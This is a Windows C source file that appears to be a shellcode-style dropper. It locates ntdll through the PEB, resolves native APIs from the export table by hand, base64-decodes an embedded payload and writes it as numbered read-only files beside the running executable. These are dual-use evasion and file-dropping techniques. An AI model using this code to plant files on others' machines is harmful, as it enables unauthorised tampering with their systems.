#define NTDLL_NAME L"ntdll.dll"
#define NTDLL_LENGTH (__crt_countof(NTDLL_NAME) - 1)

NTSTATUS FindNtdll(PPEB peb, PVOID* ntdll)
{
    if (!peb || !ntdll)
    {
        return STATUS_INVALID_PARAMETER;
    }

    PPEB_LDR_DATA ldrData = peb->Ldr;
    PLIST_ENTRY head = &ldrData->InMemoryOrderModuleList;
    *ntdll = NULL;
    for (PLIST_ENTRY current = head->Flink; current != head;
         current = current->Flink)
    {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
            current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Length >= NTDLL_LENGTH)
        {
            PUNICODE_STRING name = &entry->FullDllName;
            size_t offset =
                (name->Length / sizeof(name->Buffer[0])) - NTDLL_LENGTH;
            if (memcmp(name->Buffer + offset, NTDLL_NAME, NTDLL_LENGTH) == 0)
            {
                *ntdll = entry->DllBase;
                return STATUS_SUCCESS;
            }
        }
    }

    return STATUS_DLL_NOT_FOUND;
}

NTSTATUS FindSymbol(PVOID base, PANSI_STRING name, PVOID* symbol)
{
    NTSTATUS status = STATUS_SUCCESS;

    if (!symbol)
    {
        return STATUS_INVALID_PARAMETER;
    }

    if (*symbol)
    {
        return status;
    }

    if (DbgPrint)
    {
        DbgPrint("Locating symbol %Z in DLL mapped at 0x%llX\n", name, base);
    }

    PBYTE ntdllBase = base;
    PIMAGE_DOS_HEADER dosHeader = base;
    PIMAGE_NT_HEADERS64 ntHeaders =
        (PIMAGE_NT_HEADERS64)(ntdllBase + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY edt =
        (PIMAGE_EXPORT_DIRECTORY)(ntdllBase +
                                  ntHeaders->OptionalHeader
                                      .DataDirectory
                                          [IMAGE_DIRECTORY_ENTRY_EXPORT]
                                      .VirtualAddress);
    PDWORD exportAddresses = (PDWORD)(ntdllBase + edt->AddressOfFunctions);
    PDWORD exportNames = (PDWORD)(ntdllBase + edt->AddressOfNames);
    PWORD exportOrdinals = (PWORD)(ntdllBase + edt->AddressOfNameOrdinals);

    // I can't be bothered to make binary search work (not an algorithm I'm very
    // good at)
    status = STATUS_ENTRYPOINT_NOT_FOUND;
    DWORD i;
    for (i = 0; i < edt->NumberOfNames; i++)
    {
        PCHAR currentName = (PCHAR)(ntdllBase + exportNames[i]);
        if (memcmp(currentName, name->Buffer,
                   min(strlen(currentName), name->Length)) == 0)
        {
            status = STATUS_SUCCESS;
            break;
        }
    }

    if (!NT_SUCCESS(status))
    {
        return status;
    }

    WORD ordinal = exportOrdinals[i];
    if (ordinal < edt->NumberOfFunctions)
    {
        DWORD rva = exportAddresses[ordinal];
        *symbol = (ntdllBase + rva);
        if (DbgPrint)
        {
            DbgPrint("Located symbol %Z at 0x%llX\n", name, *symbol);
        }
        return STATUS_SUCCESS;
    }

    if (DbgPrint)
    {
        DbgPrint("Failed to locate symbol %Z\n", name);
    }

    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS LoadFunctions(PVOID ntdll)
{
    NTSTATUS status = STATUS_SUCCESS;

#ifdef _DEBUG
    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("DbgPrint"),
                        &(PVOID)DbgPrint);
    if (!NT_SUCCESS(status))
    {
        return status;
    }
#endif

    DbgPrint("Loading symbols\n");

    status =
        FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("NtCreateFile"),
                   &(PVOID)_NtCreateFile);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("NtWriteFile"),
                        &(PVOID)NtWriteFile);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("NtClose"),
                        &(PVOID)_NtClose);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("_snwprintf"),
                        &(PVOID)_snwprintf);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("memset"),
                        &(PVOID)_memset);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = FindSymbol(ntdll, &(ANSI_STRING)RTL_CONSTANT_STRING("wcsrchr"),
                        &(PVOID)_wcsrchr);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    return status;
}

NTSTATUS DecodePayload(void)
{
    DbgPrint("Decoding %zu byte payload\n", BIG_CHUNGUS_SIZE);

    base64_decodestate state;
    base64_init_decodestate(&state);
    g_decodedChungusSize = base64_decode_block(
        g_bigChungus, (const int)BIG_CHUNGUS_SIZE, g_decodedChungus, &state);
    if (g_decodedChungusSize != PAYLOAD_OUT_SIZE)
    {
        DbgPrint("Decoded size is %zu byte(s), expected %zu byte(s)\n", g_decodedChungusSize,
                 PAYLOAD_OUT_SIZE);
        return STATUS_BAD_DATA;
    }

    DbgPrint("Decoding succeeded, %zu byte(s)\n", g_decodedChungusSize);
    return STATUS_SUCCESS;
}

NTSTATUS WritePayload(PPEB peb, size_t number)
{
    // 18446744073709551615 is 20 characters, countof includes the NUL
    wchar_t buffer[MAX_PATH];
    PUNICODE_STRING imagePath = &peb->ProcessParameters->ImagePathName;
    size_t offset = _wcsrchr(imagePath->Buffer, L'\\') - imagePath->Buffer;
    _snwprintf(buffer, __crt_countof(buffer),
               L"\\DosDevices\\%.*"
               L"s\\" PAYLOAD_OUT_NAME L"%020zu" PAYLOAD_OUT_EXTENSION,
               offset, imagePath->Buffer, number);

    DbgPrint("Writing payload %zu to %ws\n", number, buffer);

    HANDLE handle = NULL;
    OBJECT_ATTRIBUTES attributes = {0};
    InitializeObjectAttributes(&attributes,
                               &(UNICODE_STRING)RTL_CONSTANT_STRING(buffer),
                               OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK ioStatus = {0};
    NTSTATUS status = _NtCreateFile(
        &handle, GENERIC_WRITE | FILE_WRITE_DATA | SYNCHRONIZE, &attributes,
        &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_READONLY, 0,
        FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    _memset(&ioStatus, 0, sizeof(IO_STATUS_BLOCK));
    status = NtWriteFile(handle, NULL, NULL, NULL, &ioStatus, g_decodedChungus,
                         (ULONG)g_decodedChungusSize, NULL, NULL);

    DbgPrint("Wrote %zu bytes\n", ioStatus.Information);

    _NtClose(handle);
    return status;
}

